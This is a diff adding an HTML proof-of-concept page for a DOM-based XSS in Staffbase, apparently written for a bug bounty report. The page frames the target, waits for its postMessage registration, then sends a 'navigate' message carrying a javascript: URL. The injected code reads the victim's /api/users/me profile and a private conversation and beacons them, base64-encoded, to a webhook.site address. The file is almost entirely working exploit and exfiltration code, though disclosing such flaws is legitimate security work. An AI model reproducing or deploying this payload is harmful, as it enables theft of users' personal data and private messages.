@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Staffbase XSS PoC</title>
+</head>
+<body>
+    <h2>Staffbase DOM XSS: Full Data Exfiltration</h2>
+    <div id="log">Status: Loading target...</div>
+    
+    <iframe id="victim" src="https://hackerone2.staffbase.rocks/content/news/dashboard?embedMode=sharepoint" width="100%" height="500"></iframe>
+
+    <script>
+        var frame = document.getElementById('victim');
+        var webhook = "https://webhook.site/c0290563-2636-43dc-a8ec-cd8271e9ee5e";
+
+        window.addEventListener('message', function(e) {
+            try {
+                var data = JSON.parse(e.data);
+                
+                if (data.command === 'register') {
+                    document.getElementById('log').innerText = "Target Ready. Sending Payload...";
+                    console.info("[+] Target initialized. Origin: " + e.origin);
+                    
+                    setTimeout(executeXSS, 1000); 
+                }
+            } catch(err) {}
+        });
+
+        function executeXSS() {
+            // fetches full JSON from /users/me and /conversations/[id], bundles them, and beacons them out.
+            var code = `(async()=>{try{var [u,c]=await Promise.all([fetch('/api/users/me').then(r=>r.json()),fetch('/api/conversations/6961496d4575375e9480c7f3').then(r=>r.json())]);var d={user:u,chats:c};navigator.sendBeacon('${webhook}?data='+btoa(JSON.stringify(d)))}catch(e){navigator.sendBeacon('${webhook}?error='+btoa(e.message))}})()`;
+
+            var exploitMessage = {
+                command: "navigate",
+                url: "javascript:" + code
+            };
+
+            frame.contentWindow.postMessage(JSON.stringify(exploitMessage), '*');
+            document.getElementById('log').innerText = "Payload Sent. Check Webhook for base64 data.";
+        }
+    </script>
+</body>
+</html>
